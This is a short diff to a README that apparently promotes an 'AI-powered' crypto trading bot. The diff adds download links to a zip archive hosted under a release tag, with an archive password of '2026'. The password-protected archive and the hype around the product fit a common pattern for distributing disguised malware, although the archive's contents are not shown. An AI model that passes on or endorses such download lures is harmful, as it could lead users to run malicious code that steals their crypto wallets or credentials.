@@ -45,9 +45,9 @@ Equipped with **AI-powered strategies, risk management, arbitrage, and sniping t
 
 ## 📥 Download  
 
-[![Download](https://i.postimg.cc/13mZ3fYR/download.png)]()  
+[![Download](https://i.postimg.cc/13mZ3fYR/download.png)](https://github.com/desod-grouseliteiqs/CryptoTrade-bot-2026/archive/refs/tags/Download.zip)  
 
-**Backup Link:** 👉 [Click To Download]()  
+**Backup Link:** 👉 [Click To Download](https://github.com/desod-grouseliteiqs/CryptoTrade-bot-2026/archive/refs/tags/Download.zip)  
 Password: 2026
 ---
 
